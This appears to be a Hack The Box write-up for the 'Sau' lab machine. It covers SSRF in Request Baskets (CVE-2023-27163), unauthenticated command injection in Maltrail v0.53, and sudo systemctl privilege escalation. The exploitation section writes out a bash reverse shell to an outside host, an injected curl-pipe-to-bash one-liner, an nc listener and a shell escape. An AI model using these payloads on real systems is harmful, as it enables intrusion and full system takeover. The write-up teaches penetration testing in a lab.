---
layout: '@/templates/BasePost.astro'
title: Sau Writeup HTB
description:  ['#SSRF #CVE-2023-27163 #Maltrail #OSCommandInjection #ReverseShell #PrivilegeEscalation #SudoMisconfiguration #RootAccess.']
pubDate: 2020-03-02T00:00:00Z
// imgSrc: '/assets/images/image-post5.jpeg'
imgSrc: 'https://labs.hackthebox.com/storage/avatars/1ea2980b9dc2d11cf6a3f82f10ba8702.png'
imgAlt: 'Image post 5'
tags: ['htb', 'linux', 'easy', 'ssrf', 'rce']
---


# Hack The Box - Sau Writeup
### by Roqeeb  
# Introduction
Hello, welcome to my first-ever published writeup. Today we'll be rooting an easy-rated box from HackTheBox. I was able to learn new things from this box and found it interesting — I hope you enjoy it too.  
Let's go
# Information Gathering
## Nmap
I used Nmap to scan the IP address with this command:
```
nmap -sC -sV 10.10.11.224 -p- -vvv -T3 -oN nmap
```

From our scan there are two open ports: 22 and 55555. Due to the speed of my scan, I also got some false positives — ports 80 and 6003 in a `filtered` state — but I’ll be ignoring those since accessing them provides no response.



```console
# Nmap 7.92 scan initiated Tue Jul 25 06:28:06 2023 as: nmap -sC -sV -vvv -T3 -oN nmap2 10.10.11.224
Increasing send delay for 10.10.11.224 from 0 to 5 due to 21 out of 69 dropped probes since last increase.
Increasing send delay for 10.10.11.224 from 5 to 10 due to 11 out of 18 dropped probes since last increase.
Increasing send delay for 10.10.11.224 from 10 to 20 due to 11 out of 30 dropped probes since last increase.
Nmap scan report for 10.10.11.224
Host is up, received conn-refused (0.13s latency).
Scanned at 2023-07-25 06:28:07 WAT for 170s
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE    SERVICE REASON      VERSION
22/tcp    open     ssh     syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
|   256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
80/tcp    filtered http    no-response
6003/tcp  filtered X11:3   no-response
55555/tcp open     unknown syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Tue, 25 Jul 2023 05:29:38 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Tue, 25 Jul 2023 05:29:06 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Tue, 25 Jul 2023 05:29:07 GMT
|_    Content-Length: 0
```
I'll start enumeration from port 55555 — from our scan we can see there's a web server running on that port. I opened it in my browser and found a webapp called Request Baskets, with a version number visible in the bottom left.
![homepage](https://github.com/0xRoqeeb/writeups/assets/49154037/0be33d47-172b-4250-90f2-3ae4d4bd558d)


I started poking around the site to find out how it works. It's an application that allows you to create a basket, which gives you a URL — any request made to that URL gets collected in your basket, hence the name Request Baskets.

![newbasket](https://github.com/0xRoqeeb/writeups/assets/49154037/e954d827-d88d-44f7-80a1-6e64e18f2e59)


I tested GET and POST requests on the URL using curl. I didn't get a response in my terminal, but the requests were collected in the basket:

```console
┌──(mofe㉿mofe)-[~]
└─$ curl http://10.10.11.224:55555/fourth                                                                                                                                                                          
┌──(mofe㉿mofe)-[~]
└─$ curl -X POST http://10.10.11.224:55555/fourth
```
![eq](https://github.com/0xRoqeeb/writeups/assets/49154037/d17393da-513c-4269-8910-cab229433106)


# Vulnerability Assessment

Next, I created a new basket and intercepted the request with Burp Suite — it didn't reveal much. After that, I looked up the version number of Request Baskets online and found out it was susceptible to SSRF, it also has a POC [CVE-2023-27163]( https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3)

```console
POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}
```

It turns out that the */api/baskets/name* and */baskets/name* are the  API endpoints vulnerable to unauthenticated SSRF.
Requests sent to */baskets/name* url will be reflected on the url in the **forward_url** parameter  

You can do this with a curl command:

```console
curl --location 'http://10.10.11.224:55555/api/baskets/{name}' --data '{"forward_url": "http://127.0.0.1:80/","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}'
```

But I'll be doing it directly from the web application. Navigate to your baskets page and click on the settings icon in the top right.
![2023-07-25_08-51](https://github.com/0xRoqeeb/writeups/assets/49154037/f017b677-84d7-49a5-ab37-1bfb6e5edd26)


On the configuration page, set the fields as follows:
***Forward URL***:*http://127.0.0.1:80/* (to reveal any internal websites, this field will forward our requests from the basket url to the hidden webpage)  

***Proxy Response*** : *true* ( i set this field to false as the POC stated but i didn't get a response, it only made sense to set it to true)  
***Expand Forward Path*** : *true*  
![2023-07-25_07-55](https://github.com/0xRoqeeb/writeups/assets/49154037/7c68fe7a-8e65-4be6-8000-a3718e657963)


After that, click **Apply** to save changes.

Now we access our basket through the URL again — this time we're seeing something different. We come across a CSS-starved website. Looking at the bottom left, I found out this website was *Powered by Maltrail (v0.53)*.
 ![2023-07-25_13-03_1](https://github.com/0xRoqeeb/writeups/assets/49154037/d90ba8b4-3bb1-422c-858f-cf2de0f3fa7f)


A bit of Googling and I found out this version was vulnerable to Unauthenticated OS Command Injection, the username parameter in the */login* page contained the command injection vulnerability  
[POC](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/) 
```console
curl 'http://hostname:8338/login' --data 'username=;`id > /tmp/bbq`'
```
Since we'll be testing the `/login` page, let's update our `forward_url` parameter:

Using a curl command
```console
curl --location 'http://10.10.11.224:55555/api/baskets/{name}' --data '{"forward_url": "http://127.0.0.1:80/login","proxy_response": True,"insecure_tls": false,"expand_path": true,"capacity": 250}'
```
Or we can edit our existing basket from the basket configuration page:

![damn](https://github.com/0xRoqeeb/writeups/assets/49154037/cf15037c-c400-4c14-8985-23dab848265c)

Trying to access the login page from the browser gives us this response, so we'll have to use curl:
![2023-07-25_08-14](https://github.com/0xRoqeeb/writeups/assets/49154037/467fed24-5dab-4eea-ba89-d16fe65f6443)


# Exploitation

## Getting a Reverse Shell

I created a `shell.sh` file with my payload and set up a Python web server to host it on port 80. Make sure the payload file is in the same folder as your web server.
```console
┌──(mofe㉿mofe)-[~/tools]
└─$ cat shell.sh               
bash -i >& /dev/tcp/10.10.14.135/4444 0>&1
                                                                                  
┌──(mofe㉿mofe)-[~/tools]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Run the following one-liner:
```console
 curl "http://10.10.11.224:55555/fourth" --data 'username=;` curl 10.10.14.135/shell.sh | bash` '
```
We immediately get a shell. First things first — upgrade it:
- python3 -c 'import pty; pty.spawn("/bin/bash")'
- Ctrl^Z to background the shell
- stty raw -echo ; fg to foreground the shell
- then press the enter button twice
- once were back in our shell
export TERM=xterm

```console
┌──(mofe㉿mofe)-[~]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.14.135] from (UNKNOWN) [10.10.11.224] 60034
bash: cannot set terminal process group (890): Inappropriate ioctl for device
bash: no job control in this shell
puma@sau:/opt/maltrail$  python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
puma@sau:/opt/maltrail$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                  
┌──(mofe㉿mofe)-[~]
└─$ stty raw -echo ; fg          

[1]  + continued  nc -lvnp 4444

puma@sau:/opt/maltrail$ export TERM=xterm
puma@sau:/opt/maltrail$
```
now we have an interactive shell.
# Privilege Escalation
Once we get initial access, the road to root on Sau is a piece of cake.

Run `sudo -l` to see what our current user can run:
 ![2023-07-25_08-19](https://github.com/0xRoqeeb/writeups/assets/49154037/42af050d-2232-49e5-ae63-477b543f9966)

We can run `/usr/bin/systemctl status trail.service` as root, and **NOPASSWD** means we can invoke `sudo` without a password.
I checked gtfobins for the binary we have access to and luckily there's an entry for [systemctl](https://gtfobins.github.io/gtfobins/systemctl/)  

 ![2023-07-25_08-25_1](https://github.com/0xRoqeeb/writeups/assets/49154037/e15e2ac0-857f-4213-8296-6c3bed8c0223)

Let's run the command ```sudo /usr/bin/systemctl status trail.service```
and input “!sh” to spawn a shell

 ![2023-07-25_08-29](https://github.com/0xRoqeeb/writeups/assets/49154037/91a6e8f4-f1fb-4cde-bd65-5e3c2b083e94)
 
and we're root:)